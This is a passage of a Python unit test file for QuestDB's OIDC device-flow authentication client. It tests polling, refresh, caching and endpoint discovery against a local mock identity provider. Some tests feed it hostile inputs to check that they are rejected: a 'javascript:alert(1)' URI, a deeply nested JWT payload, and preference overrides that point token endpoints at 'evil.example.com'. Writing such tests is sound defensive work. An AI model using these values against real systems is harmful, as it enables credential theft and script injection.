#!/usr/bin/env python3
################################################################################
##     ___                  _   ____  ____
##    / _ \ _   _  ___  ___| |_|  _ \| __ )
##   | | | | | | |/ _ \/ __| __| | | |  _ \
##   | |_| | |_| |  __/\__ \ |_| |_| | |_) |
##    \__\_\\__,_|\___||___/\__|____/|____/
##
##  Copyright (c) 2014-2019 Appsicle
##  Copyright (c) 2019-2024 QuestDB
##
##  Licensed under the Apache License, Version 2.0 (the "License");
##  you may not use this file except in compliance with the License.
##  You may obtain a copy of the License at
##
##  http://www.apache.org/licenses/LICENSE-2.0
##
##  Unless required by applicable law or agreed to in writing, software
##  distributed under the License is distributed on an "AS IS" BASIS,
##  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
##  See the License for the specific language governing permissions and
##  limitations under the License.
##
################################################################################

"""
Standalone unit tests for ``questdb.auth``.

These do not require the compiled ``questdb.ingress`` extension; they exercise
the device flow, discovery, caching, refresh and the REST adapter against an
in-process mock IdP + mock QuestDB server.

Run directly::

    python3 test/test_auth.py -v
"""

import base64
import contextlib
import importlib.util
import json
import os
import sys
import threading
import types
import unittest
import http.server
import urllib.parse
from unittest import mock

sys.dont_write_bytecode = True
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from questdb.auth import (  # noqa: E402
    OidcDeviceAuth,
    QuestDB,
    connect,
    OidcError,
    OidcConfigError,
    OidcDeviceFlowError,
    OidcTimeoutError,
    OidcInteractionRequired,
    OidcAuthError,
    OidcNetworkError,
    TokenSet,
)
from questdb.auth._cache import (  # noqa: E402
    MemoryCache, _MEMORY_GENERATION, _MEMORY_STORE)
from questdb.auth._render import Renderer  # noqa: E402

try:
    import pandas as pd
except ImportError:
    pd = None

_HAS_PG_DRIVER = (
    importlib.util.find_spec('psycopg') is not None
    or importlib.util.find_spec('psycopg2') is not None)


class _FakeAuth:
    """A stand-in OidcDeviceAuth for adapter tests (no network)."""

    _ctx = None

    def __init__(self, token='TKN'):
        self._token = token
        self.calls = 0

    def token(self):
        self.calls += 1
        return self._token

    def headers(self):
        return {'Authorization': f'Bearer {self._token}'}


def _jwt(claims):
    """Build an unsigned JWT-shaped string with the given payload claims."""
    def b64(obj):
        raw = json.dumps(obj).encode()
        return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()
    return f'{b64({"alg": "none"})}.{b64(claims)}.sig'


ID_TOKEN = _jwt({'sub': 'user-1', 'email': 'alice@example.com',
                 'groups': ['analysts']})
ACCESS_TOKEN = _jwt({'sub': 'user-1', 'scope': 'openid'})


@contextlib.contextmanager
def _raw_response_server(status, content_type, body):
    """A throwaway HTTP server that returns one fixed (status, type, body).

    Used to exercise the transport's handling of responses the scripted mock
    IdP can't produce (non-JSON 2xx, non-dict JSON, non-2xx) on the token /
    device / settings / discovery endpoints. Yields the base URL.
    """
    class _H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _send(self):
            self.send_response(status)
            self.send_header('Content-Type', content_type)
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            self._send()

        def do_POST(self):
            self.rfile.read(int(self.headers.get('Content-Length', 0)))
            self._send()

    srv = http.server.HTTPServer(('127.0.0.1', 0), _H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        yield f'http://127.0.0.1:{srv.server_port}'
    finally:
        srv.shutdown()
        srv.server_close()


class FakeClock:
    """Deterministic clock: ``sleep`` advances both monotonic and wall time."""

    def __init__(self):
        self.mono = 0.0
        self.wall = 1_000_000.0
        self.sleeps = []

    def sleep(self, dt):
        self.sleeps.append(dt)
        self.mono += dt
        self.wall += dt

    def monotonic(self):
        return self.mono

    def now(self):
        return self.wall


class MockState:
    """Scriptable behaviour shared with the request handler."""

    def __init__(self):
        self.settings = {}
        self.well_known = None
        # FIFO of (status, body) returned for device_code grant polls.
        # When exhausted, the last entry repeats.
        self.token_script = [(200, None)]  # None => default success body
        self.refresh_response = None       # (status, body) or None
        self.device_response = None        # override device-auth response body
        self.device_status = 200
        self.expected_bearer = None        # for /exec auth check
        self.exec_response = None
        self.exec_status = 200
        self.exec_raw = None               # (status, content_type, bytes) override
        # Recording.
        self.device_requests = 0
        self.token_requests = []
        self.refresh_requests = 0
        self.exec_requests = []


class _Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    @property
    def state(self):
        return self.server.state

    def _send_json(self, status, obj):
        data = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _read_form(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        return {k: v[0] for k, v in urllib.parse.parse_qs(body).items()}

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path == '/settings':
            self._send_json(200, self.state.settings)
        elif path == '/.well-known/openid-configuration':
            if self.state.well_known is None:
                self._send_json(404, {'error': 'not found'})
            else:
                self._send_json(200, self.state.well_known)
        elif path == '/exec':
            auth = self.headers.get('Authorization')
            if self.state.expected_bearer and auth != (
                    'Bearer ' + self.state.expected_bearer):
                self._send_json(401, {'error': 'unauthorized'})
                return
            self.state.exec_requests.append(self.path)
            if self.state.exec_raw is not None:
                status, ctype, raw = self.state.exec_raw
                self.send_response(status)
                self.send_header('Content-Type', ctype)
                self.send_header('Content-Length', str(len(raw)))
                self.end_headers()
                self.wfile.write(raw)
                return
            self._send_json(self.state.exec_status, self.state.exec_response or {
                'columns': [
                    {'name': 'ts', 'type': 'TIMESTAMP'},
                    {'name': 'price', 'type': 'DOUBLE'},
                ],
                'dataset': [
                    ['2021-01-01T00:00:00.000000Z', 1.5],
                    ['2021-01-02T00:00:00.000000Z', 2.5],
                ],
                'count': 2,
            })
        else:
            self._send_json(404, {'error': 'not found'})

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        form = self._read_form()
        if path == '/device':
            self.state.device_requests += 1
            if self.state.device_status != 200:
                self._send_json(self.state.device_status,
                                self.state.device_response or
                                {'error': 'invalid_client'})
                return
            body = self.state.device_response or {
                'device_code': 'DEV-CODE',
                'user_code': 'WDJB-MJHT',
                'verification_uri': 'https://idp.example.com/device',
                'verification_uri_complete':
                    'https://idp.example.com/device?user_code=WDJB-MJHT',
                'expires_in': 600,
                'interval': 5,
            }
            self._send_json(200, body)
        elif path == '/token':
            grant = form.get('grant_type')
            if grant == 'refresh_token':
                self.state.refresh_requests += 1
                status, body = self.state.refresh_response or (
                    200, self._default_token_body())
                self._send_json(status, body)
                return
            self.state.token_requests.append(form)
            idx = min(len(self.state.token_requests) - 1,
                      len(self.state.token_script) - 1)
            status, body = self.state.token_script[idx]
            if body is None:
                body = self._default_token_body()
            self._send_json(status, body)
        else:
            self._send_json(404, {'error': 'not found'})

    @staticmethod
    def _default_token_body():
        return {
            'access_token': ACCESS_TOKEN,
            'id_token': ID_TOKEN,
            'refresh_token': 'REFRESH-1',
            'token_type': 'Bearer',
            'expires_in': 3600,
            'scope': 'openid groups',
        }


class _MockServer(http.server.HTTPServer):
    def __init__(self):
        super().__init__(('127.0.0.1', 0), _Handler)
        self.state = MockState()


class AuthTestBase(unittest.TestCase):
    def setUp(self):
        _MEMORY_STORE.clear()
        _MEMORY_GENERATION.clear()
        self.server = _MockServer()
        self.state = self.server.state
        self.thread = threading.Thread(
            target=lambda: self.server.serve_forever(poll_interval=0.02),
            daemon=True)
        self.thread.start()
        self.base = f'http://127.0.0.1:{self.server.server_port}'

    def tearDown(self):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)

    def make_auth(self, *, clock=None, groups_in_token=True, cache='memory',
                  interactive=True, **kw):
        clock = clock or FakeClock()
        self._clock = clock
        return OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint=self.base + '/device',
            token_endpoint=self.base + '/token',
            scope='openid groups',
            groups_in_token=groups_in_token,
            cache=cache,
            insecure=True,
            interactive=interactive,
            renderer=Renderer(),
            _clock=clock,
            **kw)


class TestDeviceFlow(AuthTestBase):
    def test_happy_path_returns_id_token(self):
        self.state.token_script = [
            (400, {'error': 'authorization_pending'}),
            (400, {'error': 'authorization_pending'}),
            (200, None),
        ]
        auth = self.make_auth()
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)
        # 3 token polls, slept 'interval' (5s) before each.
        self.assertEqual(len(self.state.token_requests), 3)
        self.assertEqual(self._clock.sleeps, [5, 5, 5])

    def test_access_token_when_groups_not_in_token(self):
        auth = self.make_auth(groups_in_token=False)
        self.assertEqual(auth.token(), ACCESS_TOKEN)

    def test_headers(self):
        auth = self.make_auth()
        self.assertEqual(auth.headers(),
                         {'Authorization': 'Bearer ' + ID_TOKEN})

    def test_slow_down_backs_off(self):
        self.state.token_script = [
            (400, {'error': 'slow_down'}),
            (200, None),
        ]
        auth = self.make_auth()
        auth.token()
        # interval starts at 5, +5 after slow_down.
        self.assertEqual(self._clock.sleeps, [5, 10])

    def test_transient_network_error_during_poll_keeps_polling(self):
        # A dropped connection / DNS blip / timeout on a single poll must not
        # abort a sign-in the user may already have completed in the browser:
        # the loop keeps polling until the deadline (RFC 8628 §3.4). M1.
        self.state.token_script = [(200, None)]  # success once actually polled
        auth = self.make_auth()
        real_idp_post = auth._idp_post
        token_polls = {'n': 0}

        def flaky(url, form):
            # Fail only the first poll of the token endpoint; pass the device-
            # code request and later polls through to the real transport.
            if url == auth.config.token_endpoint:
                token_polls['n'] += 1
                if token_polls['n'] == 1:
                    raise OidcNetworkError('connection reset mid-poll')
            return real_idp_post(url, form)

        auth._idp_post = flaky
        self.assertEqual(auth.token(), ID_TOKEN)
        # First poll raised (transient, retried); second poll reached the IdP.
        self.assertEqual(token_polls['n'], 2)
        self.assertEqual(len(self.state.token_requests), 1)
        self.assertEqual(self._clock.sleeps, [5, 5])

    def test_transient_5xx_and_429_during_poll_keep_polling(self):
        # A 5xx server error or a 429 rate-limit (even carrying a JSON body) is
        # transient, not a terminal OAuth rejection: keep polling, backing off
        # on the rate-limit. M1.
        self.state.token_script = [
            (503, {'error': 'server_error'}),
            (429, {'error': 'slow_down'}),
            (200, None),
        ]
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(len(self.state.token_requests), 3)
        # 503 polled at the base interval; 429 bumps the interval by 5.
        self.assertEqual(self._clock.sleeps, [5, 5, 10])

    def test_non_json_4xx_during_poll_is_terminal(self):
        # A non-JSON 4xx during polling (an HTML/plain error page from a WAF or
        # reverse proxy in front of the IdP, or a non-conformant IdP) is a
        # terminal rejection: a conformant OAuth error is JSON, so it can't be
        # authorization_pending / slow_down. Fail fast with a device-flow error
        # instead of polling on to a misleading "code expired". M1.
        auth = self.make_auth()
        with _raw_response_server(
                403, 'text/html', b'<html>denied</html>') as raw:
            # Point only the poll (token) endpoint at the non-JSON 403; the
            # device-code request still hits the JSON mock IdP. Set it post-
            # construction so the (already-satisfied) co-location check isn't
            # re-run against the throwaway origin.
            auth.config.token_endpoint = raw + '/token'
            with self.assertRaises(OidcDeviceFlowError) as cm:
                auth.token()
        # Terminal on the first poll: not a timeout, and it did not keep polling
        # to the device-code deadline.
        self.assertNotIsInstance(cm.exception, OidcTimeoutError)
        self.assertLessEqual(len(self._clock.sleeps), 1)

    def test_timeout_when_never_authorized(self):
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 10, 'interval': 5,
        }
        self.state.token_script = [(400, {'error': 'authorization_pending'})]
        auth = self.make_auth()
        with self.assertRaises(OidcTimeoutError):
            auth.token()

    def test_idp_expired_token_error_raises_timeout(self):
        # The token endpoint can itself answer a poll with error=expired_token
        # (RFC 8628) — distinct from the local-deadline timeout. It must surface
        # as OidcTimeoutError carrying that error, not loop or mis-classify it.
        self.state.token_script = [(400, {'error': 'expired_token'})]
        auth = self.make_auth()
        with self.assertRaises(OidcTimeoutError) as cm:
            auth.token()
        self.assertEqual(cm.exception.error, 'expired_token')

    def test_nonpositive_expires_in_still_polls(self):
        # A non-positive expires_in in the device-auth response must be treated
        # as unknown, not as "already expired" — otherwise the flow times out
        # before its first poll even though the user can still authorize. M2.
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 0, 'interval': 5,
        }
        self.state.token_script = [(200, None)]  # success on the first poll
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(len(self.state.token_requests), 1)  # it actually polled

    def test_oversized_interval_is_clamped(self):
        # A hostile/huge interval must not pin the polling thread (which holds
        # the acquisition lock) in one enormous sleep; the per-poll sleep is
        # capped at _MAX_POLL_INTERVAL. M2.
        from questdb.auth._device import _MAX_POLL_INTERVAL
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 600, 'interval': 10 ** 9,
        }
        self.state.token_script = [(200, None)]
        auth = self.make_auth()
        auth.token()
        self.assertTrue(self._clock.sleeps)
        self.assertLessEqual(max(self._clock.sleeps), _MAX_POLL_INTERVAL)

    def test_oversized_expires_in_is_capped(self):
        # A hostile expires_in must not keep the poll loop (and the lock) alive
        # indefinitely; the lifetime is capped so a never-authorized flow still
        # terminates promptly rather than looping millions of times. M2.
        from questdb.auth._device import (
            _MAX_DEVICE_CODE_LIFETIME, _MAX_POLL_INTERVAL)
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 10 ** 9, 'interval': 10 ** 9,  # interval clamps too
        }
        self.state.token_script = [(400, {'error': 'authorization_pending'})]
        auth = self.make_auth()
        with self.assertRaises(OidcTimeoutError):
            auth.token()
        max_polls = _MAX_DEVICE_CODE_LIFETIME // _MAX_POLL_INTERVAL + 1
        self.assertLessEqual(len(self.state.token_requests), max_polls)

    def test_access_denied_is_surfaced(self):
        self.state.token_script = [
            (400, {'error': 'access_denied',
                   'error_description': 'user said no'}),
        ]
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        self.assertEqual(cm.exception.error, 'access_denied')
        self.assertIn('user said no', str(cm.exception))

    def test_device_endpoint_rejects_grant(self):
        self.state.device_status = 400
        self.state.device_response = {'error': 'invalid_client'}
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        self.assertIn('device grant', str(cm.exception))

    def test_token_caches_in_memory_across_instances(self):
        self.make_auth().token()
        self.assertEqual(self.state.device_requests, 1)
        # A brand-new instance with the same config reuses the cached token.
        self.make_auth().token()
        self.assertEqual(self.state.device_requests, 1)

    def test_groups_mode_missing_id_token_fails_without_caching(self):
        # groups_in_token=True but the completed grant carries only an
        # access_token: the poll must reject it as a terminal flow error and
        # NOT cache it (otherwise every later token() re-runs the whole
        # interactive flow). See M1.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})]  # no id_token
        auth = self.make_auth(groups_in_token=True)
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()
        self.assertIsNone(auth._tokens)  # nothing was cached

    def test_groups_mode_accepts_id_token_without_access_token(self):
        # A completed grant that returns only an id_token (no access_token) is
        # usable in groups mode and must be returned, not discarded as it was
        # when success gated on access_token. See M1.
        self.state.token_script = [(200, {
            'id_token': ID_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})]  # no access_token
        auth = self.make_auth(groups_in_token=True)
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_200_without_access_token_is_not_success(self):
        # A 200 with no access_token must not be treated as a token.
        self.state.token_script = [(200, {'token_type': 'Bearer'})]
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()

    def test_access_token_headers(self):
        auth = self.make_auth(groups_in_token=False)
        self.assertEqual(auth.headers(),
                         {'Authorization': 'Bearer ' + ACCESS_TOKEN})

    def test_clear_forces_resignin(self):
        auth = self.make_auth()
        auth.token()
        self.assertEqual(self.state.device_requests, 1)
        auth.clear()
        auth.token()
        self.assertEqual(self.state.device_requests, 2)  # prompted again

    def test_openid_scope_auto_added_for_groups_in_token(self):
        # groups-in-token requires an id_token, which needs the openid scope.
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint=self.base + '/device',
            token_endpoint=self.base + '/token',
            scope='groups', groups_in_token=True,  # no 'openid'
            cache='memory', insecure=True, renderer=Renderer())
        self.assertIn('openid', auth.config.scope.split())

    def test_zero_expires_in_is_treated_as_unknown(self):
        # A non-positive expires_in must not mark the just-issued token expired.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 0})]
        auth = self.make_auth()
        auth.token()
        self.assertTrue(auth._tokens.is_valid(self._clock.now()))

    def test_short_lived_token_valid_at_issue(self):
        # A small positive expires_in (< 2*skew) must not read as expired the
        # instant it is issued (adaptive skew = min(skew, lifetime/2)).
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 20})]
        auth = self.make_auth()
        auth.token()
        t = auth._tokens
        self.assertEqual(round(t.expires_at - t.issued_at), 20)
        self.assertTrue(t.is_valid(t.issued_at))    # usable right after issue
        self.assertFalse(t.is_valid(t.expires_at))  # but still does expire

    def test_overflow_expires_in_treated_as_unknown(self):
        # A non-finite expires_in (JSON Infinity, which json.loads accepts and
        # int(inf) turns into an OverflowError — not a ValueError) must not
        # crash; treat it as unknown so the token stays usable. See M1.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': float('inf')})]
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertTrue(auth._tokens.is_valid(self._clock.now()))

    def test_overflow_device_timing_fields_do_not_crash(self):
        # Non-finite interval / expires_in in the device-auth response (JSON
        # Infinity) must be treated as unknown, not raise OverflowError. See M1.
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': float('inf'), 'interval': float('inf')}
        self.state.token_script = [(200, None)]  # success on the first poll
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_deeply_nested_jwt_payload_does_not_crash(self):
        # A hostile/buggy IdP returning an id_token whose payload base64-decodes
        # to deeply-nested JSON must not crash token() with a raw RecursionError
        # from the best-effort identity decode (RecursionError is not a
        # ValueError); the decode degrades to no-identity and the token is still
        # returned. See _decode_jwt_claims.
        payload = base64.urlsafe_b64encode(
            (('[' * 60000) + (']' * 60000)).encode()).rstrip(b'=').decode()
        nested = f'aaa.{payload}.sig'
        self.state.token_script = [(200, {
            'id_token': nested, 'token_type': 'Bearer', 'expires_in': 3600})]
        auth = self.make_auth()
        self.assertEqual(auth.token(), nested)

    def test_idp_requests_use_configured_timeout(self):
        # The device-code / poll / refresh POSTs must use the configured
        # timeout, so a stalled IdP can't pin the acquisition lock for the
        # urllib default (30s) per network leg. See M3.
        seen = []

        def fake_post_form(url, form, *, ctx=None, insecure=False,
                           timeout=None):
            seen.append(timeout)
            if url.endswith('/device'):
                return 200, {'device_code': 'D', 'user_code': 'U',
                             'verification_uri': 'https://idp/d',
                             'expires_in': 600, 'interval': 5}
            return 200, {'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
                         'token_type': 'Bearer', 'expires_in': 3600}

        from questdb.auth import _device
        auth = self.make_auth(timeout=3)
        with mock.patch.object(_device, 'post_form', fake_post_form):
            self.assertEqual(auth.token(), ID_TOKEN)
        self.assertTrue(seen)
        self.assertTrue(
            all(t == 3 for t in seen),
            f'IdP POSTs did not all use the configured timeout: {seen}')

    def test_connect_lazy_defers_signin(self):
        # eager=False must return a session WITHOUT running the device flow; the
        # first token-needing call then triggers exactly one sign-in. See M4.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid groups',
            'acl.oidc.groups.encoded.in.token': True,
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device'}}
        qdb = connect(self.base, insecure=True, eager=False,
                      renderer=Renderer(), interactive=True, _clock=FakeClock())
        self.assertEqual(self.state.device_requests, 0)  # deferred
        self.assertEqual(qdb.token(), ID_TOKEN)           # first use signs in
        self.assertEqual(self.state.device_requests, 1)

    def test_open_browser_rejects_dangerous_scheme(self):
        auth = self.make_auth(open_browser=True)
        with mock.patch('webbrowser.open') as opener:
            auth._maybe_open_browser({'verification_uri': 'javascript:alert(1)'})
            opener.assert_not_called()
            auth._maybe_open_browser(
                {'verification_uri': 'https://idp.example.com/device'})
            opener.assert_called_once_with('https://idp.example.com/device')

    def test_memory_cache_returns_independent_copy(self):
        cache = MemoryCache()
        stored = TokenSet(access_token='a', refresh_token='r', expires_at=1.0)
        cache.store('k', stored)
        # Each load is a distinct copy — never the object handed to store(), nor
        # shared between loads — so a cached entry can't be aliased and reused.
        first = cache.load('k')
        second = cache.load('k')
        self.assertIsNot(first, stored)
        self.assertIsNot(first, second)
        self.assertEqual(first.refresh_token, 'r')

    def test_tokenset_is_frozen(self):
        # TokenSet is immutable: the lock-free fast path reads a published
        # TokenSet without a lock, which is only safe if its fields never change
        # after construction. Mutating one must raise, not silently succeed.
        import dataclasses
        t = TokenSet(access_token='a', refresh_token='r', expires_at=1.0)
        with self.assertRaises(dataclasses.FrozenInstanceError):
            t.refresh_token = 'MUTATED'
        # Deriving a modified copy is the supported idiom.
        t2 = dataclasses.replace(t, refresh_token='r2')
        self.assertEqual(t.refresh_token, 'r')
        self.assertEqual(t2.refresh_token, 'r2')

    def test_tokenset_repr_redacts_secrets(self):
        # The access/id/refresh tokens must never appear in repr() — a TokenSet
        # landing in a log line or traceback would otherwise leak credentials.
        r = repr(TokenSet(access_token='SECRET-A', id_token='SECRET-I',
                          refresh_token='SECRET-R', scope='openid'))
        self.assertNotIn('SECRET-A', r)
        self.assertNotIn('SECRET-I', r)
        self.assertNotIn('SECRET-R', r)
        self.assertIn('openid', r)  # non-secret metadata still shown


class TestNonInteractive(AuthTestBase):
    def test_non_interactive_raises_without_polling(self):
        auth = self.make_auth(interactive=False)
        with self.assertRaises(OidcInteractionRequired):
            auth.token()
        self.assertEqual(self.state.device_requests, 0)


class TestRefresh(AuthTestBase):
    def _seed_expired(self, auth, refresh_token='REFRESH-1'):
        expired = TokenSet(
            access_token='old-access', id_token='old-id',
            refresh_token=refresh_token,
            expires_at=self._clock.now() - 10)
        auth._cache.store(auth.cache_key, expired)

    def test_silent_refresh(self):
        auth = self.make_auth()
        self._seed_expired(auth)
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)  # no re-prompt

    def test_refresh_failure_falls_back_to_device_flow(self):
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (400, {'error': 'invalid_grant'})
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 1)  # re-prompted

    def test_refresh_token_preserved_when_not_rotated(self):
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 3600})  # no new refresh
        auth.token()
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')

    def test_rotated_refresh_token_is_stored(self):
        # When the IdP DOES rotate the refresh token, the new one must replace
        # the old in the cached token set — else an IdP with one-time-use
        # refresh tokens breaks on the NEXT refresh.
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'refresh_token': 'REFRESH-2',  # rotated
            'token_type': 'Bearer', 'expires_in': 3600})
        auth.token()
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-2')
        self.assertEqual(self.state.device_requests, 0)  # no re-prompt

    def test_refresh_without_id_token_falls_back_to_device_flow(self):
        # groups_in_token=True but the IdP's refresh omits the id_token: the
        # refresh is unusable, so fall back to the interactive flow rather than
        # caching it and looping (the device flow yields a complete token).
        auth = self.make_auth(groups_in_token=True)
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})  # no id_token
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)            # from the device flow
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 1)  # fell back

    def test_refresh_without_id_token_non_interactive_does_not_loop(self):
        # Same situation but non-interactive: surface a clear error rather than
        # repeatedly re-running a refresh that can never satisfy _select.
        auth = self.make_auth(groups_in_token=True, interactive=False)
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})  # no id_token
        with self.assertRaises(OidcInteractionRequired):
            auth.token()
        self.assertEqual(self.state.device_requests, 0)

    def test_cached_token_missing_required_kind_is_refreshed(self):
        # A cached, non-expired token that lacks the required kind (here:
        # access_token in non-groups mode) must not pass the cache gate and
        # then hard-fail in _select; it should trigger a refresh instead.
        auth = self.make_auth(groups_in_token=False)
        auth._cache.store(auth.cache_key, TokenSet(
            access_token=None, id_token='id', refresh_token='REFRESH-1',
            expires_at=self._clock.now() + 3600))
        token = auth.token()
        self.assertEqual(token, ACCESS_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)

    def test_refresh_network_error_propagates_without_reprompt(self):
        # Both endpoints point at a closed port (same origin, so the co-location
        # check passes), so the refresh POST fails at the transport layer. The
        # error must propagate from the *token* endpoint (the refresh), proving
        # the flow did NOT fall back to the device flow on a transient blip.
        clock = FakeClock()
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint='http://127.0.0.1:1/device',
            token_endpoint='http://127.0.0.1:1/token',  # connection refused
            scope='openid groups', groups_in_token=True, cache='memory',
            insecure=True, interactive=True, renderer=Renderer(),
            _clock=clock)
        expired = TokenSet(
            access_token='old', id_token='old-id', refresh_token='REFRESH-1',
            expires_at=clock.now() - 10)
        auth._cache.store(auth.cache_key, expired)

        with self.assertRaises(OidcNetworkError) as cm:
            auth.token()
        # The error is from the refresh (token endpoint), not a device-flow
        # fallback (device endpoint), and the refresh token is kept for a retry.
        self.assertIn('/token', str(cm.exception))
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')

    def test_refresh_transient_5xx_kept_for_retry(self):
        # A transient IdP error (5xx) during a silent refresh must NOT tear the
        # session down and re-prompt: the refresh token is still valid, so it is
        # surfaced as a retryable OidcNetworkError and the cached token (with its
        # refresh token) is kept for a later retry — matching the poll loop,
        # which also treats 5xx/429 as transient. M2.
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (503, {'error': 'temporarily_unavailable'})
        with self.assertRaises(OidcNetworkError):
            auth.token()
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)   # NOT re-prompted
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')  # kept

    def test_refresh_transient_429_kept_for_retry(self):
        # Same as the 5xx case for a 429 rate-limit. M2.
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (429, {'error': 'slow_down'})
        with self.assertRaises(OidcNetworkError):
            auth.token()
        self.assertEqual(self.state.device_requests, 0)
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')

    def test_refresh_transient_5xx_non_interactive_does_not_hard_fail(self):
        # The worst case: in a non-interactive context (papermill / cron / CI) a
        # transient refresh error must surface as a retryable OidcNetworkError,
        # NOT escalate to OidcInteractionRequired — which a fall-through to the
        # device flow would raise, hard-failing a session whose refresh token is
        # still valid and would succeed on the next attempt. M2.
        auth = self.make_auth(interactive=False)
        self._seed_expired(auth)
        self.state.refresh_response = (503, {'error': 'temporarily_unavailable'})
        with self.assertRaises(OidcNetworkError):
            auth.token()
        self.assertEqual(self.state.device_requests, 0)


class TestDiscovery(AuthTestBase):
    def test_from_questdb_reads_settings(self):
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid groups',
            'acl.oidc.groups.encoded.in.token': True,
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        auth = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, interactive=True, renderer=Renderer(),
            _clock=FakeClock())
        self.assertEqual(auth.config.client_id, 'questdb')
        self.assertTrue(auth.config.groups_in_token)
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_user_writable_preferences_cannot_override_config(self):
        # A user-writable "preferences" sibling in /settings must never override
        # the trusted "config" object during discovery: end-to-end, the resolved
        # credential endpoints come from "config", not the attacker's prefs.
        self.state.settings = {
            'config': {
                'acl.oidc.enabled': True,
                'acl.oidc.client.id': 'questdb',
                'acl.oidc.scope': 'openid groups',
                'acl.oidc.groups.encoded.in.token': True,
                'acl.oidc.token.endpoint': self.base + '/token',
                'acl.oidc.device.authorization.endpoint': self.base + '/device',
            },
            'preferences.version': 1,
            'preferences': {
                'acl.oidc.token.endpoint': 'https://evil.example.com/token',
                'acl.oidc.device.authorization.endpoint':
                    'https://evil.example.com/device',
